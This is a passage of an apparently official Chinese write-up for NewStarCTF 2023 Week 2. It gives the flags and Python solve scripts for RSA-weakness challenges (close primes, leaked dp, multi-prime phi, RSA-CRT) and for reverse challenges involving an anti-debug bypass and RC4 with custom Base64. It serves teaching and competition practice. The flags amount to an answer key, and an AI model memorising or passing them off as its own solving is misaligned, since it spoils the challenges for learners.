line="lv2N" data-language="python" class="ql-code-block ql-word-wrap-true">s.add(enc_k1 == encrypt_key(k1))</div><div line="gt0K" data-language="python" class="ql-code-block ql-word-wrap-true">s.check()</div><div line="W6Sk" data-language="python" class="ql-code-block ql-word-wrap-true">k1 = s.model()[k1].as_long()</div><div line="rH9u" data-language="python" class="ql-code-block ql-word-wrap-true"><br></div><div line="eZAj" data-language="python" class="ql-code-block ql-word-wrap-true">flag = xor(ciphertext, long_to_bytes(k1))</div><div line="9QrB" data-language="python" class="ql-code-block ql-word-wrap-true"><br></div><div line="vHpI" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-built_in">print</span>(flag)</div></div><p ql-global="true" line="4nOt"><br></p><h1><div ql-global="true" line="taQo" data-header="1" data-foldable=""><span class="ql-folder"><button type="button" class="ql-folder-trigger"></button></span>halfcandecode</div></h1><ul data-list-style="circle"><li ql-global="true" line="p3Yy" class="bullet-item"><strong>考点</strong>：RSA p-q过小, md5爆破 </li></ul><ul data-list-style="circle"><li ql-global="true" line="wvmG" class="bullet-item"><strong>FLAG</strong>：flag{two_cloabcse_t0_fact0r}</li></ul><ul data-list-style="circle"><li ql-global="true" line="ITok" class="bullet-item"><strong>解题步骤</strong></li></ul><p ql-global="true" line="BLav"><br></p><p ql-global="true" line="Zrvn">我们知道 p &lt; sqrt(n) &lt; q (假设 p &lt; q), 假设p-q过小的话,  sqrt(n) 会很接近p或者q</p><p ql-global="true" line="VvaO">md5爆破就是很正常的爆破</p><div class="ql-code-block-container" data-language="python" word-wrap="" spellcheck="false"><div line="ORnA" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *</div><div line="n5Pe" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *</div><div line="SGfo" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5</div><div line="2UV2" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-keyword">from</span> string <span class="hljs-keyword">import</span> printable</div><div line="zgvf" data-language="python" class="ql-code-block ql-word-wrap-true">n = <span class="hljs-number">113021375625152132650190712599981988437204747209058903684387817901743950240396649608148052382567758817980625681440722581705541952712770770893410244646286485083142929097056891857721084849003860977390188797648441292666187101736281034814846427200984062294497391471725496839508139522313741138689378936638290593969</span></div><div line="iIdM" data-language="python" class="ql-code-block ql-word-wrap-true">c = <span class="hljs-number">43054766235531111372528859352567995977948625157340673795619075138183683929001986100833866227688081563803862977936680822407924897357491201356413493645515962458854570731176193055259779564051991277092941379392700065150286936607784073707448630150405898083000157174927733260198355690620639487049523345380364948649</span></div><div line="uNhK" data-language="python" class="ql-code-block ql-word-wrap-true"><br></div><div line="KJVZ" data-language="python" class="ql-code-block ql-word-wrap-true">md5_hash = [</div><div line="nCJq" data-language="python" class="ql-code-block ql-word-wrap-true">    <span class="hljs-string">'4a8a08f09d37b73795649038408b5f33'</span>,</div><div line="9nDz" data-language="python" class="ql-code-block ql-word-wrap-true">    <span class="hljs-string">'03c7c0ace395d80182db07ae2c30f034'</span>,</div><div line="YR4n" data-language="python" class="ql-code-block ql-word-wrap-true">    <span class="hljs-string">'e1671797c52e15f763380b45e841ec32'</span>,</div><div line="rm6Q" data-language="python" class="ql-code-block ql-word-wrap-true">    <span class="hljs-string">'b14a7b8059d9c055954c92674ce60032'</span>,</div><div line="0g7S" data-language="python" class="ql-code-block ql-word-wrap-true">    <span class="hljs-string">'e358efa489f58062f10dd7316b65649e'</span>,</div><div line="Wn3M" data-language="python" class="ql-code-block ql-word-wrap-true">    <span class="hljs-string">'cfcd208495d565ef66e7dff9f98764da'</span>,</div><div line="A1ep" data-language="python" class="ql-code-block ql-word-wrap-true">    <span class="hljs-string">'b14a7b8059d9c055954c92674ce60032'</span>,</div><div line="hOml" data-language="python" class="ql-code-block ql-word-wrap-true">    <span class="hljs-string">'8fa14cdd754f91cc6554c9e71929cce7'</span>,</div><div line="hr0y" data-language="python" class="ql-code-block ql-word-wrap-true">    <span class="hljs-string">'0cc175b9c0f1b6a831c399e269772661'</span>,</div><div line="Zpgu" data-language="python" class="ql-code-block ql-word-wrap-true">    <span class="hljs-string">'4a8a08f09d37b73795649038408b5f33'</span>,</div><div line="Jqej" data-language="python" class="ql-code-block ql-word-wrap-true">    <span class="hljs-string">'e358efa489f58062f10dd7316b65649e'</span>,</div><div line="6shR" data-language="python" class="ql-code-block ql-word-wrap-true">    <span class="hljs-string">'cfcd208495d565ef66e7dff9f98764da'</span>,</div><div line="k02G" data-language="python" class="ql-code-block ql-word-wrap-true">    <span class="hljs-string">'4b43b0aee35624cd95b910189b3dc231'</span>,</div><div line="PM04" data-language="python" class="ql-code-block ql-word-wrap-true">    <span class="hljs-string">'cbb184dd8e05c9709e5dcaedaa0495cf'</span></div><div line="Ctl3" data-language="python" class="ql-code-block ql-word-wrap-true">]</div><div line="C1rl" data-language="python" class="ql-code-block ql-word-wrap-true"><br></div><div line="Y0wA" data-language="python" class="ql-code-block ql-word-wrap-true">q = next_prime(iroot(n, <span class="hljs-number">2</span>)[<span class="hljs-number">0</span>])</div><div line="HxY7" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-keyword">assert</span> n % q == <span class="hljs-number">0</span></div><div line="Mx7f" data-language="python" class="ql-code-block ql-word-wrap-true">p = n // q</div><div line="MRyO" data-language="python" class="ql-code-block ql-word-wrap-true"><br></div><div line="hSNi" data-language="python" class="ql-code-block ql-word-wrap-true">d = invert(<span class="hljs-number">0x10001</span>, (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))</div><div line="2ZqG" data-language="python" class="ql-code-block ql-word-wrap-true"><br></div><div line="7qDM" data-language="python" class="ql-code-block ql-word-wrap-true">m = <span class="hljs-built_in">pow</span>(c,d,n)</div><div line="d7Di" data-language="python" class="ql-code-block ql-word-wrap-true"><br></div><div line="Qy22" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-built_in">print</span>(long_to_bytes(m))</div><div line="mVYr" data-language="python" class="ql-code-block ql-word-wrap-true"><br></div><div line="FcDi" data-language="python" class="ql-code-block ql-word-wrap-true">mm = <span class="hljs-string">''</span></div><div line="8jpr" data-language="python" class="ql-code-block ql-word-wrap-true"><br></div><div line="hPeZ" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> md5_hash:</div><div line="hMQT" data-language="python" class="ql-code-block ql-word-wrap-true">    <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> printable:</div><div line="5RtV" data-language="python" class="ql-code-block ql-word-wrap-true">        <span class="hljs-keyword">if</span> md5(p.encode()).hexdigest() == h:</div><div line="jqAE" data-language="python" class="ql-code-block ql-word-wrap-true">            mm += p</div><div line="P2Om" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-built_in">print</span>(mm)</div><div line="eK1N" data-language="python" class="ql-code-block ql-word-wrap-true"><br></div></div><h2><div ql-global="true" line="utNw" data-header="2" data-foldable=""><span class="ql-folder"><button type="button" class="ql-folder-trigger"></button></span><br></div></h2><h1><div ql-global="true" line="WqrT" data-header="1" data-foldable=""><span class="ql-folder"><button type="button" class="ql-folder-trigger"></button></span><span class="ql-font-microsoftyahei">滴啤</span></div></h1><ul data-list-style="circle"><li ql-global="true" line="iCcS" class="bullet-item"><strong>考点</strong>：已知dp分解n</li></ul><ul data-list-style="circle"><li ql-global="true" line="9Rjv" class="bullet-item"><strong>FLAG</strong>：<span class="ql-font-microsoftyahei ql-size-12">flag{cd5ff82d-989c-4fbf-9543-3f98ab567546}</span></li></ul><ul data-list-style="circle"><li ql-global="true" line="UBQu" class="bullet-item"><strong>解题步骤</strong></li></ul><p ql-global="true" line="2Ovc"><br></p><p ql-global="true" line="ZCVR">我们知道 对于任意的小于p的非负自然数r, 有 r = r^(e*dp) (mod p)</p><p ql-global="true" line="txxF">故 r^(e*dp) - r = k*p, 由于 p | n, 我们可以在mod n上计算, 减小计算量.</p><div class="ql-code-block-container" data-language="python" word-wrap="" spellcheck="false"><div line="GgKC" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *</div><div line="dNUu" data-language="python" class="ql-code-block ql-word-wrap-true"><br></div><div line="x3Fz" data-language="python" class="ql-code-block ql-word-wrap-true">n = <span class="hljs-number">93172788492926438327710592564562854206438712390394636149385608321800134934361353794206624031396988124455847768883785503795521389178814791213054124361007887496351504099772757164211666778414800698976335767027868761735533195880182982358937211282541379697714874313863354097646233575265223978310932841461535936931</span></div><div line="kMJs" data-language="python" class="ql-code-block ql-word-wrap-true">dp = <span class="hljs-number">307467153394842898333761625034462907680907310539113349710634557900919735848784017007186630645110812431448648273172817619775466967145608769260573615221635</span></div><div line="6iAX" data-language="python" class="ql-code-block ql-word-wrap-true">c = <span class="hljs-number">52777705692327501332528487168340175436832109866218597778822262268417075157567880409483079452903528883040715097136293765188858187142103081639134055997552543213589467751037524482578093572244313928030341356359989531451789166815462417484822009937089058352982739611755717666799278271494933382716633553199739292089</span></div><div line="6gGY" data-language="python" class="ql-code-block ql-word-wrap-true">e = <span class="hljs-number">65537</span></div><div line="c9k4" data-language="python" class="ql-code-block ql-word-wrap-true">r = getPrime(<span class="hljs-number">64</span>)</div><div line="2RmE" data-language="python" class="ql-code-block ql-word-wrap-true">pp = <span class="hljs-built_in">pow</span>(r, e*dp, n) - r</div><div line="ujGj" data-language="python" class="ql-code-block ql-word-wrap-true"><br></div><div line="41mg" data-language="python" class="ql-code-block ql-word-wrap-true">p = GCD(n, pp)</div><div line="z14c" data-language="python" class="ql-code-block ql-word-wrap-true">q = n // p</div><div line="eZH7" data-language="python" class="ql-code-block ql-word-wrap-true">d = inverse(e, (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))</div><div line="QAKd" data-language="python" class="ql-code-block ql-word-wrap-true">m = <span class="hljs-built_in">pow</span>(c, d, n)</div><div line="UOLp" data-language="python" class="ql-code-block ql-word-wrap-true"><br></div><div line="SsCO" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-built_in">print</span>(long_to_bytes(m))</div></div><ul data-list-style="circle" style="color: rgb(220, 220, 170);"><li ql-global="true" style="color: rgb(220, 220, 170);" line="mbmr" class="bullet-item"><br></li></ul><p ql-global="true" line="hzPv"><br></p><h1><div ql-global="true" line="eebp" data-header="1" data-foldable=""><span class="ql-folder"><button type="button" class="ql-folder-trigger"></button></span><span class="ql-font-microsoftyahei">不止一个pi</span></div></h1><ul data-list-style="circle"><li ql-global="true" line="Yt9L" class="bullet-item"><strong>考点</strong>：phi(n)的一般计算公式</li></ul><ul data-list-style="circle"><li ql-global="true" line="80W1" class="bullet-item"><strong>FLAG</strong>：<span class="ql-font-microsoftyahei ql-size-12">flag{bu_zhi_yige_p1dsaf}</span></li></ul><ul data-list-style="circle"><li ql-global="true" line="mKw0" class="bullet-item"><strong>解题步骤</strong></li></ul><p ql-global="true" line="0vbG">查查百科或者了解一下即约剩余系(</p><div class="ql-code-block-container" data-language="python" word-wrap="" spellcheck="false"><div line="truQ" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *</div><div line="JQVR" data-language="python" class="ql-code-block ql-word-wrap-true"><br></div><div line="NqGq" data-language="python" class="ql-code-block ql-word-wrap-true">q =  <span class="hljs-number">115478867870347527660680329271012852043845868401928361076102779938370270670897498759391844282137149013845956612257534640259997979275610235395706473965973203544920469416283181677660262509481282536465796731401967694683575843183509430017972506752901270887444490905891490955975762524187534052478173966117471143713</span></div><div line="IrBV" data-language="python" class="ql-code-block ql-word-wrap-true">p =  <span class="hljs-number">171790960371317244087615913047696670778115765201883835525456016207966048658582417842936925149582378305610304505530997833147251832289276125084339614808085356814202236463900384335878760177630501950384919794386619363394169016560485152083893183420911295712446925318391793822371390439655160077212739260871923935217</span></div><div line="RUHk" data-language="python" class="ql-code-block ql-word-wrap-true">c =  <span class="hljs-number">4459183928324369762397671605317600157512712503694330767938490496225669985050002776253470841193156951087663107866714426230222002399666306287642591077990897883174134404896800482234781531592939043551832049756571987010173667074168282355520711905659013076509353523088583347373358980842707686611157050425584598825151399870268083867269912139634929397957514376826145870752116583185351576051776627208882377413433140577461314504762388617595282085102271510792305560608934353515552201553674287954987323321512852114353266359364282603487098916608302944694600227628787791876600901537888110093703612414836676571562487005330299996908873589228072982641114844761980143047920770114535924959765518365614709272297666231481655857243004072049094078525569460293381479558148506346966064906164209362147313371962567040047084516510135054571080612077333228195608109065475260832580192321853906138811139036658485688320161530131239854003996457871663456850196483520239675981391047452381998620386899101820782421605287708727667663038905378115235163773867508258208867367314108701855709002634592329976912239956212490788262396106230191754680813790425433763427315230330459349320412354189010684525105318610102936715203529222491642807382215023468936755584632849348996666528981269240867612068382243822300418856599418223875522408986596925018975565057696218423036459144392625166761522424721268971676010427096379610266649911939139451989246194525553533699831110568146220347603627745407449761792135898110139743498767543521297525802809254842518002190381508964357001211353997061417710783337</span></div><div line="q2AR" data-language="python" class="ql-code-block ql-word-wrap-true"><br></div><div line="cMuJ" data-language="python" class="ql-code-block ql-word-wrap-true">n = p ** <span class="hljs-number">3</span> * q ** <span class="hljs-number">2</span></div><div line="c2wI" data-language="python" class="ql-code-block ql-word-wrap-true"><br></div><div line="iZcQ" data-language="python" class="ql-code-block ql-word-wrap-true">e = <span class="hljs-number">65537</span></div><div line="PRcR" data-language="python" class="ql-code-block ql-word-wrap-true"><br></div><div line="Nb2n" data-language="python" class="ql-code-block ql-word-wrap-true">phi = p ** <span class="hljs-number">2</span> * (p - <span class="hljs-number">1</span>) * q * (q - <span class="hljs-number">1</span>)</div><div line="1Zwp" data-language="python" class="ql-code-block ql-word-wrap-true"><br></div><div line="Refq" data-language="python" class="ql-code-block ql-word-wrap-true">d = inverse(e, phi)</div><div line="aYD9" data-language="python" class="ql-code-block ql-word-wrap-true"><br></div><div line="b8Mz" data-language="python" class="ql-code-block ql-word-wrap-true">m = <span class="hljs-built_in">pow</span>(c, d, n)</div><div line="PoeO" data-language="python" class="ql-code-block ql-word-wrap-true"><br></div><div line="32fX" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-built_in">print</span>(long_to_bytes(m))</div></div><p ql-global="true" line="08S3"><br></p><h1><div ql-global="true" line="4OXD" data-header="1" data-foldable=""><span class="ql-folder"><button type="button" class="ql-folder-trigger"></button></span><span class="ql-font-microsoftyahei">partial decrypt</span></div></h1><ul data-list-style="circle"><li ql-global="true" line="UXRt" class="bullet-item"><strong>考点</strong>：RSA-CRT的解密过程</li></ul><ul data-list-style="circle"><li ql-global="true" line="MxK6" class="bullet-item"><strong>FLAG</strong>：<span class="ql-font-microsoftyahei ql-size-12">flag{rsa_with_crt#b12a3a020c9cc5f1a6df4618256f7c88c83fdd95aab1a2b2656d760475bd0bf1}</span></li></ul><ul data-list-style="circle"><li ql-global="true" line="ECVq" class="bullet-item"><strong>解题步骤</strong></li></ul><p ql-global="true" line="3k7P">RSA-CRT是一个很常见的RSA变种方案, 这道题把RSA-CRT的解密过程抽掉了一半, 可以查找相关资料得到剩余步骤. (当然, 你也可以试着自己推导一下)</p><div class="ql-code-block-container" data-language="python" word-wrap="" spellcheck="false"><div line="bVMy" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *</div><div line="tUar" data-language="python" class="ql-code-block ql-word-wrap-true"><br></div><div line="A5tc" data-language="python" class="ql-code-block ql-word-wrap-true">m2 = <span class="hljs-number">4816725107096625408335954912986735584642230604517017890897348901815741632668751378729851753037917164989698483856004115922538576470127778342121497852554884</span></div><div line="zlJm" data-language="python" class="ql-code-block ql-word-wrap-true">h = <span class="hljs-number">4180720137090447835816240697100630525624574275</span></div><div line="i0j5" data-language="python" class="ql-code-block ql-word-wrap-true">q = <span class="hljs-number">7325294399829061614283539157853382831627804571792179477843187097003503398904074108324900986946175657737035770512213530293277111992799331251231223710406931</span></div><div line="2aLx" data-language="python" class="ql-code-block ql-word-wrap-true"><br></div><div line="LMK7" data-language="python" class="ql-code-block ql-word-wrap-true">m = m2 + h*q</div><div line="GeE7" data-language="python" class="ql-code-block ql-word-wrap-true"><br></div><div line="lQiG" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-built_in">print</span>(long_to_bytes(m))</div></div><p ql-global="true" line="i8nD"><br></p><p ql-global="true" class="ql-align-center ql-heading-title" line="C3kG" data-foldable=""><span class="ql-folder"><button type="button" class="ql-folder-trigger"></button></span>Reverse</p><h1><div ql-global="true" line="gLkf" data-header="1" data-foldable=""><span class="ql-folder"><button type="button" class="ql-folder-trigger"></button></span>SMC</div></h1><ul data-list-style="circle"><li ql-global="true" line="1Itp" class="bullet-item"><strong>考点</strong>：PEB 调试标志位+SMC</li></ul><ul data-list-style="circle"><li ql-global="true" line="aDJi" class="bullet-item"><strong>FLAG</strong>：flag{SMC_1S_1nt3r3sting!!R1ght?}</li></ul><ul data-list-style="circle"><li ql-global="true" line="FC3O" class="bullet-item"><strong>解题步骤</strong></li></ul><p ql-global="true" line="4VJC">先过掉反调试，直接修改ZF标志位为1</p><p ql-global="true" line="ogkJ"><span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper "><img class="gallery-image" width="1985" height="auto" ori-width="1985" src="./NewStarCTF 2023 Week2 官方WriteUp_files/image(2).png" ori-height="709" data-src="https://uploader.shimo.im/f/4VjG6wcO05gUpyvc.png!thumbnail" crossorigin="anonymous"></span></span></span></p><p ql-global="true" line="U4L7">或者</p><p ql-global="true" line="fu3A"><span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper "><img class="gallery-image" width="628" height="auto" ori-width="628" src="./NewStarCTF 2023 Week2 官方WriteUp_files/image(3).png" ori-height="88" data-src="https://uploader.shimo.im/f/ZHlwlpqfvwAhHK9d.png!thumbnail" crossorigin="anonymous"></span></span></span>修改al的值为0都可以</p><p ql-global="true" line="QKVv"><br></p><p ql-global="true" line="bnZn">然后继续单步调试</p><p ql-global="true" line="MRJM"><span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper "><img class="gallery-image" width="971" height="auto" ori-width="971" src="./NewStarCTF 2023 Week2 官方WriteUp_files/image(4).png" ori-height="171" data-src="https://uploader.shimo.im/f/4koCzmPRA9IuXUKM.png!thumbnail" crossorigin="anonymous"></span></span></span>代码自解密的函数对代码进行异或解密，此时后面sub_403040处的代码就解密完成了，此时可以按F7单步进入。</p><p ql-global="true" line="Vsh4"><span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper "><img class="gallery-image" width="988" height="auto" ori-width="988" src="./NewStarCTF 2023 Week2 官方WriteUp_files/image(5).png" ori-height="672" data-src="https://uploader.shimo.im/f/jdNGgqTqtW4w6DT2.png!thumbnail" crossorigin="anonymous"></span></span></span>这里爆红，就需要手动创建函数，也可以按快捷键P键。</p><p ql-global="true" line="qJOP">然后按下F5键。</p><p ql-global="true" line="DRTw"><span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper "><img class="gallery-image" width="1085" height="auto" ori-width="1085" src="./NewStarCTF 2023 Week2 官方WriteUp_files/image(6).png" ori-height="293" data-src="https://uploader.shimo.im/f/Ic66ez1f2EK9Bh8r.png!thumbnail" crossorigin="anonymous"></span></span></span></p><p ql-global="true" line="fMqt"><br></p><div class="ql-code-block-container" data-language="python" word-wrap="" spellcheck="false"><div line="E9eh" data-language="python" class="ql-code-block ql-word-wrap-true">s=[ &nbsp; &nbsp;<span class="hljs-number">0x7C</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0x27</span>, </div><div line="9D2j" data-language="python" class="ql-code-block ql-word-wrap-true">&nbsp; &nbsp; <span class="hljs-number">0x68</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x71</span>]</div><div line="eULV" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(s)):</div><div line="CsCP" data-language="python" class="ql-code-block ql-word-wrap-true">&nbsp; &nbsp; <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(s[i]-<span class="hljs-number">5</span>^<span class="hljs-number">0x11</span>),end=<span class="hljs-string">""</span>)<span class="hljs-comment"># ^号运算符优先级低于减号</span></div></div><h1 class="ql-align-left"><div ql-global="true" line="4tBu" data-header="1" data-foldable=""><span class="ql-folder"><button type="button" class="ql-folder-trigger"></button></span><br></div></h1><h1 class="ql-align-left"><div ql-global="true" line="uC2r" data-header="1" data-foldable=""><span class="ql-folder"><button type="button" class="ql-folder-trigger"></button></span>AndroGenshin</div></h1><ul data-list-style="circle"><li ql-global="true" line="G3ga" class="bullet-item"><strong>考点</strong>：RC4、换表Base64</li></ul><ul data-list-style="circle"><li ql-global="true" line="FYMq" class="bullet-item"><strong>FLAG</strong>：flag{0h_RC4_w1th_Base64!!}</li></ul><ul data-list-style="circle"><li ql-global="true" line="eDwC" class="bullet-item"><strong>解题步骤</strong></li></ul><p ql-global="true" line="jnDS">通过RC4解密得到base64的表，再进行base64解密</p><p ql-global="true" line="Iz4c"><span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper "><img class="gallery-image" width="1834" height="auto" ori-width="1834" src="./NewStarCTF 2023 Week2 官方WriteUp_files/image(7).png" ori-height="224" data-src="https://uploader.shimo.im/f/DarCMa2hCekASAw6.png!thumbnail" crossorigin="anonymous"></span></span></span></p><div class="ql-code-block-container" data-language="python" word-wrap="" spellcheck="false"><div line="kjmr" data-language="python" class="ql-code-block ql-word-wrap-true">username = <span class="hljs-string">b"genshinimpact"</span></div><div line="SZ7k" data-language="python" class="ql-code-block ql-word-wrap-true">base64_table = [<span class="hljs-number">125</span>, <span class="hljs-number">239</span>, <span class="hljs-number">101</span>, <span class="hljs-number">151</span>, <span class="hljs-number">77</span>, <span class="hljs-number">163</span>, <span class="hljs-number">163</span>, <span class="hljs-number">110</span>, <span class="hljs-number">58</span>, <span class="hljs-number">230</span>, <span class="hljs-number">186</span>, <span class="hljs-number">206</span>, <span class="hljs-number">84</span>, <span class="hljs-number">84</span>, <span class="hljs-number">189</span>, <span class="hljs-number">193</span>, <span class="hljs-number">30</span>, <span class="hljs-number">63</span>, <span class="hljs-number">104</span>, <span class="hljs-number">178</span>, <span class="hljs-number">130</span>, <span class="hljs-number">211</span>,</div><div line="UHws" data-language="python" class="ql-code-block ql-word-wrap-true">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="hljs-number">164</span>, <span class="hljs-number">94</span>, <span class="hljs-number">75</span>, <span class="hljs-number">16</span>, <span class="hljs-number">32</span>, <span class="hljs-number">33</span>, <span class="hljs-number">193</span>, <span class="hljs-number">160</span>, <span class="hljs-number">120</span>, <span class="hljs-number">47</span>, <span class="hljs-number">30</span>, <span class="hljs-number">127</span>, <span class="hljs-number">157</span>, <span class="hljs-number">66</span>, <span class="hljs-number">163</span>, <span class="hljs-number">181</span>, <span class="hljs-number">177</span>, <span class="hljs-number">47</span>, <span class="hljs-number">0</span>, <span class="hljs-number">236</span>, <span class="hljs-number">106</span>, <span class="hljs-number">107</span>, <span class="hljs-number">144</span>,</div><div line="duF0" data-language="python" class="ql-code-block ql-word-wrap-true">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="hljs-number">231</span>, <span class="hljs-number">250</span>, <span class="hljs-number">16</span>, <span class="hljs-number">36</span>, <span class="hljs-number">34</span>, <span class="hljs-number">91</span>, <span class="hljs-number">9</span>, <span class="hljs-number">188</span>, <span class="hljs-number">81</span>, <span class="hljs-number">5</span>, <span class="hljs-number">241</span>, <span class="hljs-number">235</span>,</div><div line="wlPx" data-language="python" class="ql-code-block ql-word-wrap-true">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="hljs-number">3</span>, <span class="hljs-number">54</span>, <span class="hljs-number">150</span>, <span class="hljs-number">40</span>, <span class="hljs-number">119</span>, <span class="hljs-number">202</span>, <span class="hljs-number">150</span>]</div><div line="LS1p" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4</span>(<span class="hljs-params">key, data</span>):</div><div line="Y1Ls" data-language="python" class="ql-code-block ql-word-wrap-true">&nbsp; &nbsp; S = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))</div><div line="bFCS" data-language="python" class="ql-code-block ql-word-wrap-true">&nbsp; &nbsp; j = <span class="hljs-number">0</span></div><div line="g3PP" data-language="python" class="ql-code-block ql-word-wrap-true">&nbsp; &nbsp; out = []</div><div line="Xcf8" data-language="python" class="ql-code-block ql-word-wrap-true">&nbsp; &nbsp; <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):</div><div line="U0uZ" data-language="python" class="ql-code-block ql-word-wrap-true">&nbsp; &nbsp; &nbsp; &nbsp; j = (j + S[i] + key[i % <span class="hljs-built_in">len</span>(key)]) % <span class="hljs-number">256</span></div><div line="PZSs" data-language="python" class="ql-code-block ql-word-wrap-true">&nbsp; &nbsp; &nbsp; &nbsp; S[i], S[j] = S[j], S[i]</div><div line="Ah3y" data-language="python" class="ql-code-block ql-word-wrap-true">&nbsp; &nbsp; i = j = <span class="hljs-number">0</span></div><div line="mSTX" data-language="python" class="ql-code-block ql-word-wrap-true">&nbsp; &nbsp; <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> data:</div><div line="vCZL" data-language="python" class="ql-code-block ql-word-wrap-true">&nbsp; &nbsp; &nbsp; &nbsp; i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span></div><div line="3Uo7" data-language="python" class="ql-code-block ql-word-wrap-true">&nbsp; &nbsp; &nbsp; &nbsp; j = (j + S[i]) % <span class="hljs-number">256</span></div><div line="uWJb" data-language="python" class="ql-code-block ql-word-wrap-true">&nbsp; &nbsp; &nbsp; &nbsp; S[i], S[j] = S[j], S[i]</div><div line="5LpM" data-language="python" class="ql-code-block ql-word-wrap-true">&nbsp; &nbsp; &nbsp; &nbsp; out.append(t^ S[(S[i] + S[j]) % <span class="hljs-number">256</span>])</div><div line="K2Au" data-language="python" class="ql-code-block ql-word-wrap-true">&nbsp; &nbsp; <span class="hljs-keyword">return</span> out</div><div line="WTkM" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-keyword">import</span> base64</div><div line="f710" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-keyword">def</span> <span class="hljs-title function_">base64_custom_decode</span>(<span class="hljs-params">data, custom_table</span>):</div><div line="CyUg" data-language="python" class="ql-code-block ql-word-wrap-true">&nbsp; &nbsp; original_table = <span class="hljs-string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span></div><div line="oAAJ" data-language="python" class="ql-code-block ql-word-wrap-true">&nbsp; &nbsp; decode_table = <span class="hljs-built_in">str</span>.maketrans(custom_table, original_table)</div><div line="C8rm" data-language="python" class="ql-code-block ql-word-wrap-true">&nbsp; &nbsp; decoded_data = base64.b64decode(data.translate(decode_table))</div><div line="iauw" data-language="python" class="ql-code-block ql-word-wrap-true">&nbsp; &nbsp; <span class="hljs-keyword">return</span> decoded_data</div><div line="X44T" data-language="python" class="ql-code-block ql-word-wrap-true">retval = rc4(username, base64_table)</div><div line="DuPp" data-language="python" class="ql-code-block ql-word-wrap-true">new_table = <span class="hljs-string">""</span>.join([<span class="hljs-built_in">chr</span>(t) <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> retval])</div><div line="eqil" data-language="python" class="ql-code-block ql-word-wrap-true">enc_data = <span class="hljs-string">"YnwgY2txbE8TRyQecyE1bE8DZWMkMiRgJW1="</span></div><div line="F2EO" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-built_in">print</span>(base64_custom_decode(enc_data, 